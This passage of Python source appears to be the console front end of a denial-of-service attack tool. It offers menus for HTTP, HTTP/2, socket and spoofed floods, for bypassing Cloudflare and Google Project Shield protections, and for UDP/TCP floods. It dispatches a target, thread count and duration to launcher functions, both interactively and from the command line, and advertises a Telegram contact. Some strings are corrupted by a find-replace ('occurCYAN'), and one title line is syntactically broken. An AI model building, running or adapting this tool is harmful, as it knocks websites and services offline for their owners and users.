    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"cfb    "+Fore.CYAN+" |"+Fore.RED+" Bypass CF Attack                         "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxcfb  "+Fore.CYAN+" |"+Fore.RED+" Bypass CF Attack With Proxy              "+Fore.CYAN+"║\n")                  
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"cfreq  "+Fore.CYAN+" |"+Fore.RED+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"cfsoc  "+Fore.CYAN+" |"+Fore.RED+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxsky  "+Fore.CYAN+" |"+Fore.RED+" Bypass Google Project Shield, Vshield,   "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"sky    "+Fore.CYAN+" |"+Fore.RED+" Sky method without proxy                 "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"http2  "+Fore.CYAN+" |"+Fore.RED+" HTTP 2.0 Request Attack                  "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxhttp2"+Fore.CYAN+" |"+Fore.RED+" HTTP 2.0 Request Attack With Proxy       "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"get    "+Fore.CYAN+" |"+Fore.RED+" Get Request Attack                       "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"post   "+Fore.CYAN+" |"+Fore.RED+" Post Request Attack                      "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"head   "+Fore.CYAN+" |"+Fore.RED+" Head Request Attack                      "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pps    "+Fore.CYAN+" |"+Fore.RED+" Only GET / HTTP/1.1                      "+Fore.CYAN+"║\n")
    
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"spoof  "+Fore.CYAN+" |"+Fore.RED+" HTTP Spoof Socket Attack                 "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxspoof"+Fore.CYAN+" |"+Fore.RED+" HTTP Spoof Socket Attack With Proxy      "+Fore.CYAN+"║\n")
    
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"soc    "+Fore.CYAN+" |"+Fore.RED+" Socket Attack                            "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxraw  "+Fore.CYAN+" |"+Fore.RED+" Proxy Request Attack                     "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"pxsoc  "+Fore.CYAN+" |"+Fore.RED+" Proxy Socket Attack                      "+Fore.CYAN+"║\n")
    stdout.write("            "+Fore.CYAN            +"╚══════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")

def layer4():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.RED   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    stdout.write("                                 "+Fore.CYAN    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    stdout.write("                                 "+Fore.RED    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    stdout.write("             "+Fore.CYAN            +"╔═════════════════════════════════════════════════════╗\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"udp   "+Fore.CYAN+"|"+Fore.RED+" UDP Attack                                "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"tcp   "+Fore.CYAN+"|"+Fore.RED+" TCP Attack                                "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")

def tools():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.RED   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.CYAN    +" ║ ║ ║║ ║║  ╚═╗             \n")
    stdout.write("                                 "+Fore.RED    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    stdout.write("             "+Fore.CYAN            +"╔═════════════════════════════════════════════════════╗\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"geoip "+Fore.CYAN+"|"+Fore.RED+" Geo IP Address Lookup"+Fore.CYAN+"                     ║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"dns   "+Fore.CYAN+"|"+Fore.RED+" Classic DNS Lookup   "+Fore.CYAN+"                     ║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"subnet"+Fore.CYAN+"|"+Fore.RED+" Subnet IP Address Lookup   "+Fore.CYAN+"               ║\n")
    stdout.write("             "+Fore.CYAN            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")

def center_text(text, total_width):
    spaces = (total_width - len(text)) // 2
    return " " * spaces + text

def title():
    stdout.write("                                                           \n")
    stdout.write("                                 "+Fore.RED┌─┐┌─┐┬ ┬  ┬┌─┐ \n")
    stdout.write("                                "+Fore.CYAN└─┐│ ││ └┐┌┘├┤  \n")
    stdout.write("                                 "+Fore.RED└─┘└─┘┴─┘└┘ └─┘ \n")
    stdout.write("             "+Fore.CYAN+"╔═════════════════════════════════════════════════════╗\n")
    stdout.write("             "+Fore.CYAN+"║ "+Fore.RED   +"          Type [ ? ] to see the commands     "+Fore.CYAN +"       ║\n")
    stdout.write("             "+Fore.CYAN+"║ "+Fore.RED   +"         Contact - Telegram @internalvpns   "+Fore.CYAN +"        ║\n")
    stdout.write("             "+Fore.CYAN+"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")

title()

def command():
    stdout.write(Fore.CYAN+"╔═══"+Fore.CYAN+"[""root"+Fore.LIGHTCYAN_EX+"@"+Fore.CYAN+"input"+Fore.RED+"]"+Fore.CYAN+"\n╚══\x1b[38;2;0;255;189m> "+Fore.RED)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "cCYANits":
        cCYANit()        
    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
        layer7()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "test":
        target, thread, t = get_info_l7()
        test1(target, thread, t)
        time.sleep(10)
    elif command == "http2" or command == "HTTP2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif command == "pxhttp2" or command == "PXHTTP2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "pxcfb" or command == "PXCFB":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif command == "pps" or command == "PPS":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join() 
    elif command == "spoof" or command == "SPOOF":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join() 
    elif command == "pxspoof" or command == "PXSPOOF":
        target, thread, t = get_info_l7()
        #timer = threading.Thread(target=countdown, args=(t,))
        #timer.start()
        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
        #timer.join()
        time.sleep(1000)
    elif command == "get" or command == "GET":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command == "post" or command == "POST":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif command == "head" or command == "HEAD":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif command == "pxraw" or command == "PXRAW":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command == "soc" or command == "SOC":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "pxsoc" or command == "PXSOC":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command == "cfreq" or command == "CFREQ":
        target, thread, t = get_info_l7()
        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
    elif command == "cfsoc" or command == "CFSOC":
        target, thread, t = get_info_l7()
        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
    elif command == "pxsky" or command == "PXSKY":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif command == "sky" or command == "SKY":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
        

##############################################################################################     
    elif command == "subnet":
        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"IP "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurCYAN while sending the request to the API!')                   
            
    elif command == "dns":
        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"IP/DOMAIN "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurCYAN while sending the request to the API!')
            
    elif command == "geoip":
        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"IP "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurCYAN while sending the request to the API!')
    else:
        stdout.write(Fore.CYAN+" [>] "+Fore.RED+"Unknown command. type 'help' to see all commands.\n")  
##############################################################################################   

def func():
    stdout.write(Fore.CYAN+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.CYAN+"]\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"cfb        "+Fore.CYAN+": "+Fore.RED+"Bypass CF attack\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"pxcfb      "+Fore.CYAN+": "+Fore.RED+"Bypass CF attack with proxy\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"cfpro      "+Fore.CYAN+": "+Fore.RED+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"cfsoc      "+Fore.CYAN+": "+Fore.RED+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
#    stdout.write(Fore.CYAN+" • "+Fore.RED+"sky        "+Fore.CYAN+": "+Fore.RED+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
#    stdout.write(Fore.CYAN+" • "+Fore.RED+"stellar    "+Fore.CYAN+": "+Fore.RED+"HTTPS Sky method without proxies\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"raw        "+Fore.CYAN+": "+Fore.RED+"Request attack\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"post       "+Fore.CYAN+": "+Fore.RED+"Post Request attack\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"head       "+Fore.CYAN+": "+Fore.RED+"Head Request attack\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"soc        "+Fore.CYAN+": "+Fore.RED+"Socket attack\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"pxraw      "+Fore.CYAN+": "+Fore.RED+"Proxy Request attack\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"pxsoc      "+Fore.CYAN+": "+Fore.RED+"Proxy Socket attack\n")
    
    #stdout.write(Fore.CYAN+" \n["+Fore.RED+"LAYER 4"+Fore.CYAN+"]\n")
    #stdout.write(Fore.CYAN+" • "+Fore.RED+"tcp        "+Fore.CYAN+": "+Fore.RED+"Strong TCP attack (not supported)\n")
    #stdout.write(Fore.CYAN+" • "+Fore.RED+"udp        "+Fore.CYAN+": "+Fore.RED+"Strong UDP attack (not supported)\n")

    stdout.write(Fore.CYAN+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.CYAN+"]\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"dns        "+Fore.CYAN+": "+Fore.RED+"Classic DNS Lookup\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"geoip      "+Fore.CYAN+": "+Fore.RED+"Geo IP Address Lookup\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"subnet     "+Fore.CYAN+": "+Fore.RED+"Subnet IP Address Lookup\n")
    
    stdout.write(Fore.CYAN+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.CYAN+"]\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"clear/cls  "+Fore.CYAN+": "+Fore.RED+"Clear console\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"exit       "+Fore.CYAN+": "+Fore.RED+"Bye..\n")
    stdout.write(Fore.CYAN+" • "+Fore.RED+"cCYANit     "+Fore.CYAN+": "+Fore.RED+"Thanks for\n")

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "pxcfb":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif method == "get":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif method == "post":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "head":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "pxraw":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif method == "pxsoc":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif method == "cfreq":
        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
    elif method == "cfsoc":
        stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.CYAN+" [*] "+Fore.RED+"Failed to bypass cf\n")
    elif method == "http2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif method == "pxhttp2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif method == "pxsky":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif method == "sky":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    else:
        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")

